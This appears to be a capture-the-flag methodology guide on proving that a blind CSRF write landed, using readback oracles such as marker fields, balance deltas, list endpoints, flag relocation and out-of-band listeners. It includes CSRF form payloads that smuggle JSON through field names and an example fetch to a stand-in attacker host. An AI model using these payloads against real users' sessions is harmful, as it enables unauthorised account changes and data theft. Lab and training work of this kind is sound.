# Readback oracles — proving a blind CSRF landed

The CSRF request fires in a context you don't control — the bot's
browser, the victim's session. You never see the response. The
proof is the STATE CHANGE you read back separately, not the
request's HTTP status.

---

## 1. The principle

```text
the CSRF page fires the write and navigates away — its response is
invisible to you. the confirmation is a DIFFERENT request you make
later that reads the state the write changed.
```

Never claim "the CSRF worked" from a `200` on the delivery — the
delivery reaching the server isn't the write landing. Read the
resulting state.

## 2. The oracle shapes

| Oracle | How it confirms |
|---|---|
| an object you own that the write modifies | the marker field on your own object |
| a list/stats endpoint | the write's record appears |
| a count/length field | the delta a write produces |
| a second-order read | the write's value surfacing elsewhere |
| the flag itself | the write moved the flag to a reachable place |
| an OOB hit | the page or the server phoned home |

## 3. The marker-write oracle — the cleanest

```text
1. create an object you control — a post, a profile field, a note
2. the CSRF payload writes a UNIQUE MARKER into it
3. read the object back — the marker present = the write landed
```

```html
<!-- write a unique marker -->
<input name='{"bio":"csrf-marker-7f3a","i":"' value='"}'>
```

```bash
# read back the object you own
curl -s -b "$COOKIE_JAR" "$BASE/api/me" | grep -o 'csrf-marker-7f3a'
curl -s "$BASE/api/posts/<my-id>" | grep -o 'csrf-marker-7f3a'
```

The unique marker (not a common string) attributes THIS write — a
marker that could only come from your payload proves the delivery,
not ambient state.

## 4. The state-change oracle — before/after

```bash
# 1. baseline — before the CSRF
curl -s -b "$COOKIE_JAR" "$BASE/api/balance"   # {"balance":100}
# 2. deliver the CSRF (a transfer write)
# 3. re-read — after
curl -s -b "$COOKIE_JAR" "$BASE/api/balance"   # {"balance":99} — delta
```

The delta between before and after is the proof. Record both values
— a `confirms` verdict needs the attributable change, not "something
changed".

## 5. The list/stats oracle — the write appears in a list

```text
the write creates a record — a comment, a vote, a registration, a
machine-entry, a log-line — that a list endpoint returns.
```

```bash
# the TornadoService shape — the write registered a machine, /stats
# lists it
curl -s "$BASE/stats" | grep -o 'host-1051\|csrf-marker'
```

The record's presence in a list the CSRF created is the readback —
no direct access to the written object needed.

## 6. The flag-relocation oracle — the write moved the flag

```text
the CSRF writes the flag somewhere readable:
- a profile field the flag was copied into
- a comment/note the flag got pasted into
- a transfer of the flag-object to your account
- an assignment/permission that exposes it
```

```bash
# the flag landed in a place you read
curl -s -b "$COOKIE_JAR" "$BASE/api/me" | grep -oE '[A-Za-z0-9_]+\{[^}]+\}'
curl -s "$BASE/api/assignment/<my-id>" | grep -oE 'HTB\{[^}]+\}'
```

The flag in YOUR readable context = the CSRF extracted it. Then
`hooks.py pre-flag --value <flag>` — from the live response.

## 7. The second-order oracle — the write surfaces elsewhere

```text
the write's value renders on a DIFFERENT page:
- a stored bio on the profile page
- a comment that shows under the post
- a field that appears in an admin view you can reach
- an email/webhook the write triggers
```

Read the surface page — the written value's presence confirms.

## 8. The OOB oracle — the page or server phones home

```text
when the CSRF page itself can still reach you, OR the server
fetches something on write:
- a fetch('https://attacker/hit?d=1') the page fires after the write
- a webhook/callback the server calls on the write
- a DNS/HTTP hit to your listener
```

```bash
python3 tools/web/oob_listener.py serve --port 8001 &
python3 tools/web/oob_listener.py hits
# a hit after the delivery = the page ran (and possibly the write)
```

The page's own OOB hit proves the page LOADED and ran — combined
with the state readback, it's the full chain. The page's hit alone
only proves load, not the write.

## 9. The timing oracle — when only duration differs

```text
a write that takes measurably longer on success:
- a successful write triggers a downstream op (hash, render, notify)
- the endpoint's response time differs write vs no-write
```

Measure the delivery's observable side-effect timing — weak, but a
signal when nothing else differs.

## 10. The poll pattern — reading after the bot cycle

```bash
# submit the CSRF URL to the bot, then poll the oracle
for i in $(seq 1 30); do
  curl -s "$BASE/api/me" | grep -o 'csrf-marker-7f3a' && break
  sleep 2
done
```

The bot's visit is async — poll the oracle on an interval until the
state appears or a timeout declares inconclusive.

## 11. The negative-oracle — a read that proves NO write

```text
the object unchanged, the list without the record, the balance
unmoved — the delivery failed. Record it:
  refutes: no state change after N bot cycles
then change the delivery (content-type, carrier, field shape) —
not retry the identical one.
```

## 12. The attribution problem — was it YOUR write?

```text
on a shared instance, another team's CSRF might change the same
state. the unique marker is the attribution — a marker only your
payload produces, not 'admin' or '1' that anyone writes.
```

```html
<!-- attributed: a nonce only your page sends -->
<input name='{"tag":"csrf-9f2ab1-mine","i":"' value='"}'>
```

## 13. The falsifier

```text
every oracle reads unchanged across N deliveries AND the write's
preconditions (reachable, content-type, no token) were all met —
the class is inconclusive or closed for this endpoint; the gate
held somewhere. Record which gate refused.
```

## 14. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "readback: marker-write oracle on my own object"
python3 tools/hooks.py post-probe <c> --verdict confirms \
  --hypothesis-id <H> --class web-csrf --evidence-kind impact \
  --evidence 'bio now reads csrf-marker-7f3a' --response '<body>'
```
